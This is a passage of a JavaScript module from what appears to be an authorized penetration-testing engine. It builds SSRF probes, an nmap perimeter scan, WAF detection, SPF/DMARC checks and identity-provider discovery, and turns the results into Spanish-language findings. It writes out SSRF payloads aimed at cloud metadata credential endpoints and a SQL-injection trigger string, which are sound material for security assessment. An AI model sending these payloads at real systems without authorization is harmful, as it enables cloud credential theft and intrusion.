        description: `cloud_enum encontró «${hit.msg}» en ${hit.target} por permutación del nombre del cliente, marcado como accesible sin autenticación. Candidato, no confirmado: verificar a mano que el recurso pertenece de verdad al cliente auditado antes de tratarlo como hallazgo (un bucket/cuenta con ese nombre puede pertenecer a otra organización).`,
        remediation: "Si el recurso es del cliente: bloquear el acceso anónimo/listado público (S3 Block Public Access, contenedor privado en Azure, uniform bucket-level access en GCS). Si no pertenece al cliente, descartar como falso positivo de atribución.",
      });
    } else {
      out.push({
        title: `${platform}: recurso cloud descubierto por nombre (candidato — confirmar pertenencia)`,
        severity: "Info",
        description: `cloud_enum confirmó la existencia de «${hit.msg}» en ${hit.target} por permutación del nombre del cliente (acceso: ${hit.access}). No implica datos expuestos por sí solo; inventario de superficie cloud no visible por crawling pasivo. Confirmar que el recurso pertenece al alcance autorizado antes de sondearlo más.`,
        remediation: "Ninguna por sí sola: es inventario de superficie a confirmar. Si pertenece al cliente y requiere auth, sin acción; si es de otra organización, descartar.",
      });
    }
    if (out.length >= 15) break;
  }
  return out;
}

/* ------------------------------------------------------------------------ *
 * SSRF genérico → AWS Instance Metadata Service (IMDS, 169.254.169.254):
 * si algún parámetro típico de "fetch de URL" acepta la IMDS y la respuesta
 * refleja contenido de metadata/credenciales, es SSRF confirmado hacia la
 * superficie cloud más crítica que existe. Una sola petición de lectura
 * por parámetro, nada destructivo.
 * https://hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf.html
 * ------------------------------------------------------------------------ */
export const SSRF_IMDS_PARAMS = ["url", "callback", "webhook", "image", "avatar", "feed", "uri", "path", "target", "proxy"];
export const SSRF_IMDS_TEST_URL = "http://169.254.169.254/latest/meta-data/iam/security-credentials/";

export function ssrfImdsCurlSteps(step, prefix, baseUrl, maxTime = "10") {
  return SSRF_IMDS_PARAMS.map((param) =>
    step(`${prefix}-${param}`, "curl", [
      "-s", "-L", "--max-time", maxTime,
      "-G", "--data-urlencode", `${param}=${SSRF_IMDS_TEST_URL}`,
      baseUrl,
    ], null, {
      desc: `Sonda SSRF: ¿${param}= reenvía la petición a metadata AWS?`,
    }),
  );
}

/** Señal fuerte (credencial real filtrada) vs. señal débil (solo categorías IMDS listadas). */
export const SSRF_IMDS_STRONG_RE = /"AccessKeyId"\s*:|"SecretAccessKey"\s*:/i;
export const SSRF_IMDS_WEAK_RE = /\bami-id\b|\binstance-id\b|\bsecurity-credentials\b|\blocal-ipv4\b/i;

/* ------------------------------------------------------------------------ *
 * SSRF multi-cloud: GCP y Azure exponen metadata en la MISMA IP link-local
 * (169.254.169.254) que AWS, pero ambos EXIGEN un header propio
 * (Metadata-Flavor: Google / Metadata: true) para responder — algo que un
 * SSRF ciego no puede forjar (la app vulnerable hace el fetch con SU
 * propio HTTP client, no con headers que nosotros controlemos). Por eso
 * la señal "fuerte" (metadata real filtrada) solo aplica si la app
 * reenvía headers arbitrarios además de la URL; la señal realista es que
 * la petición SÍ llegó al servicio de metadata real y fue rechazada POR
 * LA NUBE (no por timeout/red) — eso ya confirma SSRF real hacia
 * superficie interna, solo que este endpoint puntual está bien defendido.
 * ------------------------------------------------------------------------ */
export const SSRF_CLOUD_METADATA = {
  aws: { url: SSRF_IMDS_TEST_URL, label: "AWS" },
  gcp: { url: "http://169.254.169.254/computeMetadata/v1/project/project-id", label: "GCP" },
  azure: { url: "http://169.254.169.254/metadata/instance?api-version=2021-02-01", label: "Azure" },
};

function ssrfCloudCurlSteps(step, prefix, baseUrl, testUrl, label, maxTime) {
  return SSRF_IMDS_PARAMS.map((param) =>
    step(`${prefix}-${param}`, "curl", [
      "-s", "-L", "--max-time", maxTime,
      "-G", "--data-urlencode", `${param}=${testUrl}`,
      baseUrl,
    ], null, {
      desc: `Sonda SSRF: ¿${param}= reenvía la petición a metadata ${label}?`,
    }),
  );
}

export function ssrfGcpImdsCurlSteps(step, prefix, baseUrl, maxTime = "10") {
  return ssrfCloudCurlSteps(step, prefix, baseUrl, SSRF_CLOUD_METADATA.gcp.url, "GCP", maxTime);
}

export function ssrfAzureImdsCurlSteps(step, prefix, baseUrl, maxTime = "10") {
  return ssrfCloudCurlSteps(step, prefix, baseUrl, SSRF_CLOUD_METADATA.azure.url, "Azure", maxTime);
}

export const SSRF_GCP_STRONG_RE = /"numericProjectId"\s*:|"serviceAccounts"\s*:/i;
export const SSRF_GCP_BLOCKED_RE = /Metadata-Flavor/i;
export const SSRF_AZURE_STRONG_RE = /"subscriptionId"\s*:|"resourceGroupName"\s*:|"osProfile"\s*:/i;
export const SSRF_AZURE_BLOCKED_RE = /Required metadata header not specified|invalid Metadata header/i;

/* ------------------------------------------------------------------------ *
 * Cortafuegos — dos capas:
 *
 * 1) Caja negra (lo que el informe muestra siempre): nmap de perímetro
 *    (open vs filtered) + WAF que BLOQUEA una sonda inofensiva. No toca
 *    iptables del cliente; infiere el filtro desde fuera, igual que un
 *    atacante real.
 * 2) Caja gris (solo si el target ES el host donde corre el motor:
 *    127.0.0.1/localhost): lectura de ufw/iptables/nft. Ahí sí son las
 *    reglas activas del sistema auditado. Nunca se corre contra un host
 *    remoto: ese ruleset sería el de Kali, no el del cliente.
 * ------------------------------------------------------------------------ */

export const PERIMETER_PORTS = [
  "21", "22", "23", "25", "53", "80", "88", "110", "135", "139", "143", "389", "443", "445",
  "636", "3268", "3269", "3389", "5432", "5900", "5985", "5986", "6379",
  "1433", "1521", "2049", "3306",
  "8080", "8443", "9200", "11211", "27017",
];

/** Servicios que no deberían estar en 0.0.0.0/0. SSH es habitual; el resto es superficie grave. */
export const EXPOSED_SERVICE_RISK = {
  21: { name: "FTP", severity: "Medium" },
  22: { name: "SSH", severity: "Low" },
  23: { name: "Telnet", severity: "High" },
  53: { name: "DNS", severity: "Medium" },
  88: { name: "Kerberos", severity: "High" },
  135: { name: "MSRPC", severity: "High" },
  139: { name: "NetBIOS", severity: "High" },
  389: { name: "LDAP", severity: "High" },
  445: { name: "SMB", severity: "High" },
  636: { name: "LDAPS", severity: "Medium" },
  3268: { name: "Global Catalog", severity: "High" },
  3269: { name: "Global Catalog SSL", severity: "Medium" },
  1433: { name: "MSSQL", severity: "High" },
  1521: { name: "Oracle", severity: "High" },
  2049: { name: "NFS", severity: "High" },
  3306: { name: "MySQL/MariaDB", severity: "High" },
  3389: { name: "RDP", severity: "High" },
  5432: { name: "PostgreSQL", severity: "High" },
  5900: { name: "VNC", severity: "High" },
  5985: { name: "WinRM", severity: "High" },
  5986: { name: "WinRM HTTPS", severity: "High" },
  6379: { name: "Redis", severity: "High" },
  9200: { name: "Elasticsearch", severity: "High" },
  11211: { name: "Memcached", severity: "High" },
  27017: { name: "MongoDB", severity: "High" },
};

export function perimeterNmapArgs(host, extraPort) {
  const ports = new Set(PERIMETER_PORTS);
  const extra = String(extraPort || "").trim();
  if (/^\d+$/.test(extra)) ports.add(extra);
  return ["-Pn", "-sT", "-p", [...ports].sort((a, b) => Number(a) - Number(b)).join(","), host];
}

/**
 * Parsea la tabla clásica de nmap: "PORT STATE SERVICE".
 * Ignora líneas de cabecera y host-down.
 */
export function parseNmapPortTable(nmapText) {
  const open = [];
  const filtered = [];
  const closed = [];
  const re = /^(\d+)\/tcp\s+(open|filtered|closed)\b(?:\s+(\S+))?/gim;
  let m;
  while ((m = re.exec(String(nmapText || "")))) {
    const row = { port: Number(m[1]), state: m[2].toLowerCase(), service: m[3] || "" };
    if (row.state === "open") open.push(row);
    else if (row.state === "filtered") filtered.push(row);
    else closed.push(row);
  }
  return { open, filtered, closed };
}

export function perimeterFirewallFindings(nmapText) {
  const { open, filtered } = parseNmapPortTable(nmapText);
  const out = [];
  const seenRisk = new Set();
  for (const row of open) {
    const risk = EXPOSED_SERVICE_RISK[row.port];
    if (!risk || seenRisk.has(row.port)) continue;
    seenRisk.add(row.port);
    const svc = risk.name;
    out.push({
      title: `${svc} (TCP/${row.port}) expuesto a Internet sin filtrar`,
      severity: risk.severity,
      description: `nmap desde fuera ve ${row.port}/tcp open (${row.service || svc}). Ese servicio no debería ser alcanzable desde 0.0.0.0/0: es superficie de fuerza bruta, RCE conocidos o dump de datos (CWE-284). Un Security Group, NACL, ufw o iptables debería dejarlo solo en la red de administración.`,
      remediation: `Cerrar ${row.port}/tcp al mundo. UFW: \`ufw deny ${row.port}/tcp\` y permitir solo la IP de administración (\`ufw allow from 10.0.0.0/8 to any port ${row.port}\`). iptables: \`-A INPUT -p tcp --dport ${row.port} -s <red-admin> -j ACCEPT\` y \`-A INPUT -p tcp --dport ${row.port} -j DROP\`. En AWS: Security Group sin 0.0.0.0/0 en ese puerto.`,
    });
  }
  if (filtered.length) {
    const sample = filtered.slice(0, 8).map((r) => `${r.port}/tcp`).join(", ");
    out.push({
      title: `Perímetro con filtrado de paquetes (${filtered.length} puerto(s) filtered)`,
      severity: "Info",
      description: `nmap marca ${filtered.length} puerto(s) como filtered (drop/NACL/SG/WAF de red, no RST): ${sample}${filtered.length > 8 ? "…" : ""}. Es contexto de gobierno: hay un filtro delante del host, no una vulnerabilidad. Explica timeouts de otras sondas.`,
      remediation: "Ninguna por el filtrado en sí. Revisar que los puertos de aplicación previstos (80/443) sigan open y que los de gestión (22, 3389, BD) sigan filtered o closed desde Internet.",
    });
  }
  return out;
}

/** Sonda inofensiva que un WAF con CRS/OWASP suele cortar (403/406 + página de bloqueo). */
export const WAF_TRIGGER_QUERY = "ds_waf_probe=1'+UNION+SELECT+NULL--";
export const WAF_BLOCK_STATUS_RE = /HTTP\/1\.[01]\s+(403|406|419|429|501|503)\b|^DS_HTTP:(403|406|419|429|501|503)\b/im;
export const WAF_BLOCK_BODY_RE = /attention required|cloudflare|just a moment|request rejected|mod_security|modsecurity|the requested url was rejected|blocked by|web application firewall|not acceptable|access denied|incident id|support id|sqli detected|anomaly score/i;

export function wafTriggerFindings(probeText) {
  const t = String(probeText || "");
  if (!t.trim()) return [];
  const blocked = WAF_BLOCK_STATUS_RE.test(t) && WAF_BLOCK_BODY_RE.test(t);
  const blockedStatusOnly = WAF_BLOCK_STATUS_RE.test(t) && /forbidden|not acceptable|rejected/i.test(t);
  if (!blocked && !blockedStatusOnly) return [];
  return [{
    title: "WAF activo: bloqueó una sonda de inyección (caja negra)",
    severity: "Info",
    description: "Una petición GET con un payload clásico de UNION SELECT en query string fue cortada por el perímetro (HTTP 403/406/429/5xx + página/firma de WAF). No es vulnerabilidad: documenta que hay control activo delante de la app, no solo un CDN que reenvía.",
    remediation: "Ninguna. Verificar que las reglas cubren OWASP CRS (SQLi, XSS, LFI) y que no hay bypass por otro vhost/API sin el mismo WAF.",
  }];
}

export function dropContradictoryWafFindings(findings) {
  const list = Array.isArray(findings) ? findings : [];
  const hasWaf = list.some((f) => /WAF activo:|WAF\/CDN identificado:/i.test((f && f.title) || ""));
  if (!hasWaf) return list;
  return list.filter((f) => !/Sin WAF\/CDN identificable/i.test((f && f.title) || ""));
}

/**
 * Parsea stdout de wafw00f (JSON con -f json -o -, o el texto clásico).
 * Solo emite hallazgo cuando el binario nombra un producto; "No WAF
 * detected" no inventa ausencia (eso lo decide missingWafFinding).
 */
export function wafw00fFindings(text) {
  const t = String(text || "").trim();
  if (!t) return [];
  const names = [];
  const seen = new Set();
  function add(name) {
    const n = String(name || "").replace(/\s+/g, " ").trim();
    if (!n || /^none$/i.test(n)) return;
    const key = n.toLowerCase();
    if (seen.has(key)) return;
    seen.add(key);
    names.push(n);
  }
  const jsonBlob = t.match(/\[[\s\S]*\]/) || t.match(/\{[\s\S]*\}/);
  if (jsonBlob) {
    try {
      const parsed = JSON.parse(jsonBlob[0]);
      const rows = Array.isArray(parsed) ? parsed : [parsed];
      rows.forEach((row) => {
        if (!row || row.detected === false) return;
        add(row.firewall || row.waf || row.name);
      });
    } catch {
      /* cae al parser de texto */
    }
  }
  if (!names.length) {
    const re = /is behind\s+(.+?)\s+WAF/gi;
    let m;
    while ((m = re.exec(t)) !== null) add(m[1]);
  }
  return names.map((name) => ({
    title: `WAF/CDN identificado: ${name}`,
    severity: "Info",
    description: `wafw00f identificó ${name} delante de la aplicación (huella activa de producto, no solo cabeceras). No es una vulnerabilidad: es contexto de gobierno — explica por qué ciertas sondas pueden llegar bloqueadas y documenta la capa de defensa perimetral.`,
    remediation: "Ninguna: es información de contexto. Verificar que las reglas cubren OWASP CRS y que no hay un origen/API publicado sin el mismo WAF.",
  }));
}

export function missingWafFinding(headText, triggerText, isPublicDomain, wafw00fText) {
  if (!isPublicDomain) return [];
  const alreadyWaf = wafFindings(headText).length > 0 || wafw00fFindings(wafw00fText).length > 0;
  // Sin salida de p1-waf-trigger aún no se puede concluir ausencia: las
  // heurísticas se reevalúan tras cada paso y HEAD va antes que la sonda.
  const triggerRan = String(triggerText || "").trim().length > 0;
  if (!triggerRan) return [];
  const blocked = wafTriggerFindings(triggerText).length > 0;
  if (alreadyWaf || blocked) return [];
  return [{
    title: "Sin WAF/CDN identificable desde caja negra",
    severity: "Low",
    description: "Ni las cabeceras de la raíz ni una sonda de inyección inofensiva identifican un WAF/CDN delante del dominio público. La aplicación queda expuesta a Internet sin esa capa. No prueba que no exista un filtro opaco, pero sí que no hay huella ni bloqueo observable.",
    remediation: "Desplegar WAF (Cloudflare, AWS WAF, ModSecurity/OWASP CRS, o el del proveedor) delante de 80/443; bloquear SQLi/XSS/LFI por defecto; no publicar orígenes de API sin el mismo control.",
  }];
}

function looksLikePermissionDenied(text) {
  return /permission denied|operation not permitted|you must be root|must be root|not found|command not found/i.test(String(text || ""));
}

/**
 * Interpreta ufw/iptables/nft YA leídos en el host local. Si no hay
 * privilegios o el binario no existe, no inventa hallazgos (el paso queda
 * en el feed para el operador).
 */
export function hostFirewallFindings(ufwText, iptablesText, nftText) {
  const ufw = String(ufwText || "");
  const ipt = String(iptablesText || "");
  const nft = String(nftText || "");
  const out = [];

  if (ufw.trim() && !looksLikePermissionDenied(ufw)) {
    if (/Status:\s*inactive/i.test(ufw)) {
      out.push({
        title: "UFW inactivo en el host auditado",
        severity: "Medium",
        description: "ufw status verbose reporta Status: inactive. En un servidor Linux que sirve la aplicación, el host firewall está apagado: cualquier puerto en LISTEN queda expuesto al segmento de red (CWE-284). Complementa, no sustituye, al Security Group de la nube.",
        remediation: "`ufw default deny incoming`, `ufw allow 22/tcp` (solo red de admin), `ufw allow 80,443/tcp`, `ufw enable`. Revisar que Docker no publique puertos con 0.0.0.0 si no deben ser públicos.",
      });
    } else if (/Status:\s*active/i.test(ufw)) {
      if (/Default:\s*allow\s+\(incoming\)/i.test(ufw) || /Default:\s*allow$/im.test(ufw)) {
        out.push({
          title: "UFW activo pero política por defecto ALLOW",
          severity: "High",
          description: "UFW está encendido con default allow incoming: las reglas explícitas de deny no cubren puertos nuevos que un servicio abra mañana. La postura correcta es default deny + allow de lo estrictamente necesario.",
          remediation: "`ufw default deny incoming` y allow solo 22 (admin), 80 y 443 (o el puerto de la app).",
        });
      } else {
        out.push({
          title: "UFW activo (default deny) en el host auditado",
          severity: "Info",
          description: "El host tiene UFW activo. Contexto de gobierno de caja gris: hay control local de paquetes además del perímetro de red/nube.",
          remediation: "Ninguna. Revisar que los allow coincidan con el alcance publicado (no dejar 3306/6379/22 abiertos a Anywhere).",
        });
      }
    }
  }

  const iptReadable = ipt.trim() && !looksLikePermissionDenied(ipt);
  if (iptReadable) {
    const ufwActive = /Status:\s*active/i.test(ufw) || /Chain ufw-/i.test(ipt);
    if (/Chain INPUT \(policy ACCEPT\)/i.test(ipt) && !ufwActive) {
      out.push({
        title: "iptables INPUT con política ACCEPT (sin UFW activo)",
        severity: "Medium",
        description: "La cadena INPUT tiene policy ACCEPT y no hay UFW activo encima. El kernel acepta tráfico a cualquier puerto en LISTEN salvo reglas DROP puntuales — equivalente a no tener host firewall.",
        remediation: "Instalar y activar UFW (default deny) o pasar INPUT a DROP/REJECT y allow explícito de 22/80/443. Evitar Docker publicando en 0.0.0.0.",
      });
    } else if (/Chain INPUT \(policy DROP\)|Chain INPUT \(policy REJECT\)/i.test(ipt)) {
      out.push({
        title: "iptables INPUT con política default deny",
        severity: "Info",
        description: "iptables INPUT está en DROP/REJECT. El host filtra por defecto; solo entra lo allow-listeado.",
        remediation: "Ninguna. Auditar que no haya -j ACCEPT a 0.0.0.0/0 en puertos de gestión o de base de datos.",
      });
    }
  }

  const nftReadable = nft.trim() && !looksLikePermissionDenied(nft);
  if (nftReadable && /hook input/i.test(nft) && /policy accept/i.test(nft) && !/Status:\s*active/i.test(ufw)) {
    if (!out.some((f) => /iptables INPUT con política ACCEPT/i.test(f.title))) {
      out.push({
        title: "nftables input hook con policy accept",
        severity: "Medium",
        description: "nft list ruleset muestra un hook input en policy accept. Igual que iptables ACCEPT: el host no niega por defecto.",
        remediation: "Cambiar el hook input a drop/reject y allow solo los puertos publicados, o activar UFW encima.",
      });
    }
  }
  return out;
}

/* ------------------------------------------------------------------------ *
 * Email/domain security — SPF y DMARC, sobre TXT ya obtenido por dig. Pasivo:
 * no envía correo, solo interpreta registros públicos. Ausencia o política
 * débil de SPF/DMARC habilita spoofing/phishing usando el dominio auditado.
 * ------------------------------------------------------------------------ */
export const SPF_RECORD_RE = /v=spf1[^"'\n]*/i;
export const DMARC_RECORD_RE = /v=DMARC1[^"'\n]*/i;

export function domainSecurityFindings(txtText, dmarcText, root) {
  const out = [];
  const txt = String(txtText || "");
  const dmarc = String(dmarcText || "");
  const domain = root || "el dominio";

  const spfMatch = txt.match(SPF_RECORD_RE);
  if (!spfMatch) {
    out.push({
      title: `Dominio ${domain} sin registro SPF`,
      severity: "Medium",
      description: `No hay TXT con v=spf1 para ${domain} (CWE-290). Sin SPF, cualquiera puede enviar correo falsificando el remitente @${domain}: es la base técnica de campañas de phishing/BEC contra clientes y empleados que confían en el dominio.`,
      remediation: `Publicar un registro SPF (TXT) que enumere los emisores autorizados y termine en -all (hard fail), p.ej.: "v=spf1 include:_spf.google.com -all".`,
    });
  } else {
    const spf = spfMatch[0];
    if (/\+all\b/i.test(spf)) {
      out.push({
        title: `SPF de ${domain} permite cualquier origen (+all)`,
        severity: "High",
        description: `El registro SPF de ${domain} termina en +all: autoriza explícitamente a CUALQUIER servidor a enviar correo como @${domain} (CWE-290). Es equivalente a no tener SPF, pero además parece configurado a propósito.`,
        remediation: `Cambiar +all por -all (hard fail) y enumerar solo los emisores reales autorizados (include:, ip4:, ip6:).`,
      });
    } else if (!/-all\b/i.test(spf)) {
      out.push({
        title: `SPF de ${domain} sin hard fail (-all)`,
        severity: "Low",
        description: `El registro SPF de ${domain} no termina en -all (usa ~all/softfail, ?all/neutral, o ningún mecanismo all). Los correos falsificados suelen entregarse igual, marcados como sospechosos como mucho, según la política del receptor.`,
        remediation: `Terminar el registro SPF en -all una vez validados todos los emisores legítimos, para que el receptor rechace explícitamente el resto.`,
      });
    }
  }

  const dmarcMatch = dmarc.match(DMARC_RECORD_RE);
  if (!dmarcMatch) {
    out.push({
      title: `Dominio ${domain} sin política DMARC`,
      severity: "Medium",
      description: `No hay TXT v=DMARC1 en _dmarc.${domain} (CWE-290). Sin DMARC no hay política de qué hacer con correo que falla SPF/DKIM, ni reporte agregado (rua=) para detectar abuso del dominio en curso.`,
      remediation: `Publicar TXT en _dmarc.${domain}: "v=DMARC1; p=quarantine; rua=mailto:dmarc-reports@${domain}"; escalar a p=reject tras validar que no rompe correo legítimo.`,
    });
  } else {
    const pMatch = dmarcMatch[0].match(/;\s*p=(\w+)/i);
    const policy = pMatch ? pMatch[1].toLowerCase() : null;
    if (policy === "none") {
      out.push({
        title: `DMARC de ${domain} en modo monitorización (p=none)`,
        severity: "Low",
        description: `DMARC está publicado pero con p=none: el dominio recibe reportes de spoofing (si rua está configurado) pero no bloquea ni pone en cuarentena nada. Correo falsificado que falla SPF/DKIM llega igual a la bandeja del destinatario.`,
        remediation: `Tras validar los reportes rua/ruf, subir la política a p=quarantine y finalmente p=reject.`,
      });
    }
  }

  return out;
}

/* ------------------------------------------------------------------------ *
 * Org attack surface — ASN/organización del target vía RDAP de IP (pasivo,
 * mismo mecanismo HTTPS que el WHOIS/RDAP de dominio ya existente). Solo
 * contexto: qué red/organización anuncia la IP, útil para verificar que el
 * host en scope realmente pertenece al cliente y no a un tercero (CDN,
 * hosting compartido) antes de reportarlo como activo propio.
 * ------------------------------------------------------------------------ */
export function ipRdapCheckStep(step, ip, maxTime = "15") {
  if (!ip) return [];
  return [
    step("p1-osint-rdap-ip", "curl", [
      "-s", "--max-time", maxTime, `https://rdap.org/ip/${ip}`,
    ], null, {
      desc: `RDAP de la IP ${ip}: ASN/organización que la anuncia`,
    }),
  ];
}

export function orgAttackSurfaceFindings(rdapIpText, host, ip) {
  const out = [];
  const text = String(rdapIpText || "");
  if (!text.trim()) return out;
  let json = null;
  try { json = JSON.parse(text); } catch { /* respuesta no-JSON (rate limit, error) */ }
  if (!json) return out;

  const name = json.name || null;
  const handle = json.handle || null;
  const entities = Array.isArray(json.entities) ? json.entities : [];
  const orgNames = entities
    .map((e) => (Array.isArray(e.vcardArray) && e.vcardArray[1]
      ? (e.vcardArray[1].find((v) => v[0] === "fn") || [])[3]
      : null))
    .filter(Boolean);

  if (name || handle || orgNames.length) {
    out.push({
      title: `IP de ${host || ip} anunciada por ${orgNames[0] || name || handle}`,
      severity: "Info",
      description: `RDAP de ${ip} identifica la red como "${name || handle}"${orgNames.length ? ` (organización: ${orgNames.join(", ")})` : ""}. Contexto de superficie: confirma si el host pertenece a infraestructura propia del cliente o a un tercero (CDN, cloud compartido, hosting) — relevante para no reportar como "activo propio" algo que no lo es, o para ampliar el scope si aparece infraestructura hermana bajo la misma organización.`,
      remediation: "Ninguna: es contexto de inventario de activos, no una vulnerabilidad. Confirmar con el cliente si la organización identificada coincide con el alcance autorizado.",
    });
  }
  return out;
}

export const HYPERSCALER_HOLDER_RE = /amazon|aws\b|google|microsoft|azure|cloudflare|akamai|fastly|digitalocean|hetzner|ovh|linode|oracle|alibaba|tencent|leaseweb|choopa|vultr/i;

export function extractAsnFromBlob(rawBlob) {
  const text = String(rawBlob || "");
  const ripe = text.match(/"asns"\s*:\s*\[\s*"?(\d{1,10})"?/);
  if (ripe) return ripe[1];
  const origin = text.match(/originautnums"\s*:\s*\[\s*(\d{1,10})/);
  if (origin) return origin[1];
  const handle = text.match(/"handle"\s*:\s*"AS(\d{1,10})"/i);
  if (handle) return handle[1];
  const asMatch = text.match(/\bAS(\d{1,10})\b/);
  return asMatch ? asMatch[1] : null;
}

export function extractAsnHolderFromBlob(rawBlob) {
  const text = String(rawBlob || "");
  try {
    const json = JSON.parse(text);
    const recs = json && json.data && json.data.records;
    if (Array.isArray(recs)) {
      for (const group of recs) {
        if (!Array.isArray(group)) continue;
        for (const row of group) {
          const key = String(row.key || row.type || "").toLowerCase();
          if (key === "org-name" || key === "orgname" || key === "descr" || key === "owner") {
            const v = String(row.value || row.values || "").trim();
            if (v) return v.slice(0, 120);
          }
        }
      }
    }
    if (json && json.name) return String(json.name).slice(0, 120);
  } catch { /* no JSON */ }
  const m = text.match(/"value"\s*:\s*"([^"]{3,80})"/);
  return m ? m[1] : "";
}

export function ripeAsnCurlSteps(step, ip, maxTime = "15") {
  if (!ip) return [];
  return [
    step("p1-osint-ripe-asn", "curl", [
      "-s", "--max-time", maxTime,
      `https://stat.ripe.net/data/network-info/data.json?resource=${encodeURIComponent(ip)}`,
    ], null, {
      desc: `RIPEstat: ASN que anuncia ${ip}`,
    }),
  ];
}

export function orgAsnSiblingFindings(whoisText, prefixesText, asn, host, hyperscaler) {
  const out = [];
  const asnLabel = asn ? `AS${asn}` : "ASN";
  const holder = extractAsnHolderFromBlob(whoisText) || "";
  if (hyperscaler) {
    out.push({
      title: `${asnLabel} es de un hyperscaler/CDN (${holder || "proveedor compartido"}) — sin expansión de prefijos`,
      severity: "Info",
      description: `La IP de ${host || "el target"} cae en ${asnLabel}${holder ? ` (${holder})` : ""}. El ASN es de un proveedor cloud/CDN: sus prefijos anunciados NO se tratan como superficie del cliente (guardia de scope). Solo se documenta el bloque de la IP en alcance.`,
      remediation: "Ninguna. No ampliar el alcance autorizado a rangos del proveedor. Confirmar con el cliente si el activo es tenant propio o SaaS de tercero.",
    });
    return out;
  }
  const prefixes = [];
  try {
    const json = JSON.parse(String(prefixesText || ""));
    const list = json && json.data && json.data.prefixes;
    if (Array.isArray(list)) {
      for (const row of list) {
        const p = row && (row.prefix || row);
        if (typeof p === "string" && p.includes("/")) prefixes.push(p);
        if (prefixes.length >= 12) break;
      }
    }
  } catch { /* no JSON */ }
  if (prefixes.length) {
    out.push({
      title: `${asnLabel}${holder ? ` (${holder})` : ""} anuncia ${prefixes.length}+ prefijo(s) hermano(s)`,
      severity: "Info",
      description: `RIPEstat lista prefijos anunciados por ${asnLabel} además de la IP en scope (muestra: ${prefixes.slice(0, 6).join(", ")}). Inventario: infraestructura hermana bajo el mismo ASN. NO se ha escaneado ninguno — ampliar el alcance requiere autorización explícita del cliente.`,
      remediation: "Ninguna acción de ataque. Presentar al cliente la lista de prefijos y decidir si se firma un alcance ampliado. No port-scanear rangos hermanos sin ROE.",
    });
  } else if (asn) {
    out.push({
      title: `IP de ${host || "el target"} pertenece a ${asnLabel}${holder ? ` (${holder})` : ""}`,
      severity: "Info",
      description: `RIPEstat asocia la IP en scope a ${asnLabel}. No se listaron prefijos hermanos (rate-limit, ASN vacío o guardia de hyperscaler).`,
      remediation: "Ninguna: contexto de inventario.",
    });
  }
  return out;
}

/* ------------------------------------------------------------------------ *
 * Identity Provider recon — SOLO descubrimiento pasivo de tenant (una
 * petición GET a un endpoint público de metadata/realm, sin probar
 * credenciales ni enumerar usuarios). Confirma qué IdP gestiona el dominio
 * (M365/Entra ID, Google Workspace, Okta) para dimensionar el ataque de
 * phishing/password-spray en el informe — nunca ejecuta el ataque.
 *
 * Enumeración de usuarios pre-auth (validar qué correos existen contra el
 * IdP) es deliberadamente MÁS invasiva que un discovery pasivo — se deja
 * fuera del playbook determinista y solo debe ofrecerse en modo agente
 * ReAct con gate de aprobación explícita (DANGEROUS_TOOLS en agent.js),
 * nunca automática.
 * ------------------------------------------------------------------------ */
export function idpDiscoveryCurlSteps(step, root, maxTime = "12") {
  if (!root) return [];
  return [
    step("p1-idp-m365-realm", "curl", [
      "-s", "--max-time", maxTime,
      `https://login.microsoftonline.com/getuserrealm.srf?login=user@${root}&xml=1`,
    ], null, {
      desc: `Descubrimiento pasivo de tenant M365/Entra ID para ${root}`,
    }),
    step("p1-idp-entra-oidc", "curl", [
      "-s", "--max-time", maxTime,
      `https://login.microsoftonline.com/${encodeURIComponent(root)}/.well-known/openid-configuration`,
    ], null, {
      desc: `Metadata OIDC Entra ID (GUID de tenant) para ${root}`,
    }),
    step("p1-idp-okta-wellknown", "curl", [
      "-s", "--max-time", maxTime, "-o", "/dev/null", "-w", "%{http_code}",
      `https://${root}/.well-known/openid-configuration`,
    ], null, {
      desc: `¿${root} expone metadata OIDC propia (Okta/Auth0/IdP self-hosted)?`,
    }),
    step("p1-idp-saml-fedmeta", "curl", [
      "-s", "--max-time", maxTime, "-o", "/dev/null", "-w", "%{http_code}",
      `https://${root}/FederationMetadata/2007-06/FederationMetadata.xml`,
    ], null, {
      desc: `¿${root} expone metadata SAML/ADFS?`,
    }),
    step("p1-idp-saml-wellknown", "curl", [
      "-s", "--max-time", maxTime, "-o", "/dev/null", "-w", "%{http_code}",
      `https://${root}/.well-known/federationmetadata/2007-06/federationmetadata.xml`,
    ], null, {
      desc: `¿${root} expone metadata SAML en .well-known?`,
    }),
  ];
}

export const M365_NAMESPACE_RE = /NameSpaceType>\s*(Managed|Federated)\s*</i;
export const M365_FEDERATION_BRAND_RE = /FederationBrandName>([^<]+)</i;
export const ENTRA_ISSUER_GUID_RE = /login\.microsoftonline\.com\/([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})/i;
export const GWS_MX_RE = /aspmx\.l\.google\.com|googlemail\.com/i;
export const M365_MX_RE = /mail\.protection\.outlook\.com|\.mail\.eo\.outlook\.com/i;

export function idpDiscoveryFindings(m365Text, oidcHttpCode, root, extra = {}) {
  const out = [];
  const m365 = String(m365Text || "");
  const domain = root || "el dominio";
  const entraText = String(extra.entraOidcText || "");
  const mxText = String(extra.mxText || "");
  const samlCode = String(extra.samlHttpCode || "").trim();

  const nsMatch = m365.match(M365_NAMESPACE_RE);
  if (nsMatch) {
    const type = nsMatch[1];
    const brandMatch = m365.match(M365_FEDERATION_BRAND_RE);
    out.push({
      title: `${domain} confirmado como tenant Microsoft 365/Entra ID (${type})`,
      severity: "Info",
      description: `El endpoint público getuserrealm.srf confirma que ${domain} es un tenant ${type === "Federated" ? "federado (ADFS/IdP externo)" : "gestionado (cloud-only o password hash sync)"} de Microsoft 365/Entra ID${brandMatch ? ` — marca de federación: ${brandMatch[1]}` : ""}. Contexto de superficie de ataque: dimensiona el riesgo de password-spray contra login.microsoftonline.com y de phishing dirigido a Office 365. NO se ha intentado ninguna credencial ni enumerado usuarios — solo descubrimiento de tenant.`,
      remediation: "Ninguna acción técnica por este hallazgo en sí. Recomendar MFA obligatorio, Conditional Access y bloqueo de protocolos legacy (IMAP/POP/SMTP básico) que son el vector típico de password-spray contra M365.",
    });
  }

  const guidMatch = entraText.match(ENTRA_ISSUER_GUID_RE);
  if (guidMatch) {
    out.push({
      title: `${domain} resuelve a tenant Entra ID ${guidMatch[1]}`,
      severity: "Info",
      description: `login.microsoftonline.com/${domain}/.well-known/openid-configuration publica issuer con GUID ${guidMatch[1]}. Discovery pasivo de tenant (una GET a metadata de Microsoft); no se enumeran usuarios ni se prueban credenciales.`,
